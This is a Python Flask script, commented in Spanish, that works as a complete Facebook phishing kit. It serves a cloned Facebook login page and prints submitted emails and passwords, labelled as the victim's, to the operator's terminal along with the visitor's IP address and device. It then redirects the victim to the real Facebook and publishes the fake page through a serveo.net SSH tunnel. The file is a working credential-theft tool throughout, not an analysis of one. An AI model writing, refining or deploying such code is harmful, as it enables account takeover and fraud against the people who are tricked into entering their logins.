import os
import uuid
import hashlib
import sys
from flask import Flask, request, redirect
import threading
import subprocess

# Función para verificar la integridad del código
def verificar_integridad():
    hash_original = "f39ceb3e1a66b4e718a3f87874319c17cb8ca77971c0648325311d5547e9695c"
    with open(__file__, 'rb') as f:
        contenido = f.read()
        hash_actual = hashlib.sha256(contenido).hexdigest()
    if hash_actual != hash_original:
        # Mostrar el contenido de copyright.txt
        if os.path.exists('copyright.txt'):
            with open('copyright.txt', 'r') as f:
                print(f.read())
        else:
            print("Este código ha sido modificado de forma no autorizada.")
        sys.exit()

# Verificar la integridad del código antes de continuar
verificar_integridad()

# Configuración de Flask
app = Flask(__name__)

# Genera un UUID único
def generate_unique_id():
    return str(uuid.uuid4())

# Ruta para la página principal
@app.route('/')
def index():
    return '''
    <h1>Bienvenido a zphdozer</h1>
    <p>Marca 1 para elegir la primera opción</p>
    <p><a href="/facebook_login">1: Facebook login</a></p>
    '''

# Ruta para el formulario de inicio de sesión
@app.route('/facebook_login')
def facebook_login():
    return '''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Facebook Login</title>
        <link rel="stylesheet" href="/static/styles.css">
    </head>
    <body>
      <a href="#" class="sp">Español</a>
        <div class="container">
            <div class="logo">
                <img src="https://www.facebook.com/images/fb_icon_325x325.png" alt="Facebook Logo">
            </div>
            <form action="/submit_form" method="post">
                <div class="form-group">
                    <input type="text" id="email" name="email" placeholder="Celular o correo electrónico">
                </div>
                <div class="form-group">
                    <input type="password" id="password" name="password" placeholder="Contraseña">
                </div>
                <button type="submit" class="btn">Iniciar sesión</button>
                <a href="#" class="forgot-password">¿Olvidaste tu contraseña?</a>
            </form>
            <div class="create-account">
                <button type="button">Crear cuenta nueva</button>
            </div>
            <div class="meta">
                <p>
                    <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/v3/yM/r/DDgwTv3JehF.png" alt="Meta Logo">
                </p>
                <a href="#">Información</a>
                <a href="#">Ayuda</a>
                <a href="#">Más</a>
            </div>
        </div>
    </body>
    </html>
    '''

# Ruta para manejar el envío del formulario
@app.route('/submit_form', methods=['POST'])
def submit_form():
    email = request.form['email']
    password = request.form['password']

    # Limpiar la terminal
    os.system('clear' if os.name == 'posix' else 'cls')

    # Mostrar los datos en el formato especificado
    print("\n𝐂𝐎𝐑𝐑𝐄𝐎 𝐄𝐋𝐄𝐂𝐓𝐑Ó𝐍𝐈𝐂𝐎/𝐍Ú𝐌𝐄𝐑𝐎 𝐃𝐄 𝐓𝐄𝐋É𝐅𝐎𝐍𝐎 𝐃𝐄 𝐋𝐀 𝐕𝐈𝐂𝐓𝐈𝐌𝐀.---")
    print(f"{email}\n")
    print("𝐂𝐎𝐍𝐓𝐑𝐀𝐒𝐄Ñ𝐀.---")
    print(f"{password}\n")
    print("𝐈𝐏.---")
    print(f"{request.remote_addr}\n")
    print("𝐃𝐈𝐒𝐏𝐎𝐒𝐈𝐓𝐈𝐕𝐎.---")
    print(f"{request.user_agent.platform}\n")
    print("𝐏𝐀𝐈𝐒.---")
    print("Por implementar")  # Aquí se puede implementar el uso de una API de geolocalización si es necesario.
    print("\n𝐂𝐈𝐔𝐃𝐀𝐃.---")
    print("Por implementar")
    print("\n𝐂𝐎𝐃𝐈𝐆𝐎 𝐏𝐎𝐒𝐓𝐀𝐋.---")
    print("Por implementar\n")
    print("🤬𝑫𝚯𝚭𝚭𝚬𝑅來𝚳𝚾〽️\n")
    print("☠️𝐃𝐎𝐌𝐈𝐍𝐀.\n")

    # Redirigir al usuario a Facebook
    return redirect('https://www.facebook.com')
    
# Configuración para servir archivos estáticos (CSS)
@app.route('/static/<path:filename>')
def static_files(filename):
    return app.send_static_file(filename)

def create_css():
    css_content = '''
    body {
        background-image: url('https://i.postimg.cc/6pmht26N/Picsart-24-07-31-23-26-07-700.jpg');
        background-size: cover;
        background-position: center;
        font-family: Arial, Helvetica, sans-serif;
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        min-height: 100vh;
        margin: 0;
    }

    .container {
        padding: 30px;
        width: 350px;
        text-align: center;
    }

    .logo {
        display: flex;
        justify-content: center;
        margin-bottom: 80px;
    }

    .logo img {
        width: 63px;
        height: 63px;
    }

    .form-group {
        margin-bottom: 20px;
    }

    .form-group input {
        width: 100%;
        padding: 15px;
        border: 1px solid #ddd;
        border-radius: 10px;
        box-sizing: border-box;
        font-size: 16px;
        background: rgba(255, 255, 255, 0.8);
        color: #333;
        outline: none;
        transition: border-color 0.3s;
    }

    .form-group input::placeholder {
        color: rgba(51, 51, 51, 0.5);
    }

    .form-group input:focus {
        border-color: #1877f2;
    }

    .btn {
        background-color: #1877f2;
        color: #fff;
        padding: 15px 20px;
        border: none;
        border-radius: 24px;
        cursor: pointer;
        width: 100%;
        font-size: 16px;
        transition: background-color 0.3s;
        margin-top: 5px;
    }

    .btn:hover {
        background-color: #1465c6;
    }

    .forgot-password {
        margin-top: 20px;          
        font-size: 14px;
        color: #000000;
        text-decoration: none;
    }

    .create-account {
        margin-top: 105px;
    }

    .create-account button {
        background-color: #fff;
        color: #1877f2;
        padding: 12px 20px;
        border: 1px solid #1877f2;
        border-radius: 24px;
        cursor: pointer;
        width: 100%;
        font-size: 16px;
        transition: background-color 0.3s;
    }

    .create-account button:hover {
        background-color: #e9ebee;
    }

    .meta {
        margin-top: 25px;
        font-size: 12px;
        color: #808080;
    }

    .meta a {
        color: #808080;
        text-decoration: none;
        margin: 0 5px;
    }

    .meta a:hover {
        text-decoration: underline;
    }

    .meta img {
        width: 60px;
        height: auto;
        opacity: 65%;
    }

    .sp {
        margin-top: 10px;
        font-size: 13.5px;
        color: #000000;
        opacity: 73.5%;
        text-decoration: none;
    }
    '''
    os.makedirs('static', exist_ok=True)
    with open('static/styles.css', 'w') as css_file:
        css_file.write(css_content)

def run_server():
    app.run(host='0.0.0.0', port=5001)

def start_serveo():
    # Conectar a Serveo y redirigir el puerto 5001
    process = subprocess.Popen(['ssh', '-R', '80:localhost:5001', 'serveo.net'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    url = ''
    for line in process.stdout:
        if b'http' in line:
            url = line.decode().strip()
            break
    return url

def main():
    unique_id = generate_unique_id()  # Genera un UUID único

    # Banner en color rojo
    banner = '''
\033[95m  _________  _   _ ____   ___ __________ ____   
 |__  /  _ \| | | |  _ \ / _ \__  / ____|  _ \  
   / /| |_) | |_| | | | | | | |/ /|  _| | |_) | 
  / /_|  __/|  _  | |_| | |_| / /_| |___|  _ <  
 /____|_|   |_| |_|____/ \___/____|_____|_| \_\ 
                                              \033[95m
    '''
    print(banner)

    # Mostrar menú para selección de opciones
def mostrar_menu():
    print("\nOpciones:")
    print("1: Iniciar servidor")
    print("2: Salir")

    opcion = input("Elige una opción (1/2): ").strip()

    if opcion == '1':
        create_css()  # Crear archivo CSS
        server_thread = threading.Thread(target=run_server)
        server_thread.daemon = True
        server_thread.start()
        print("Servidor en ejecución en http://localhost:5001")
        url_serveo = start_serveo()
        if url_serveo:
            print(f"Tu servidor está disponible en: {url_serveo}")
        else:
            print("No se pudo obtener la URL de Serveo.")
        input("Presiona Enter para salir...")
    elif opcion == '2':
        print("Saliendo...")
        sys.exit()
    else:
        print("Opción inválida. Inténtalo de nuevo.")
        mostrar_menu()  # Mostrar el menú nuevamente en caso de opción inválida

if __name__ == '__main__':
    mostrar_menu()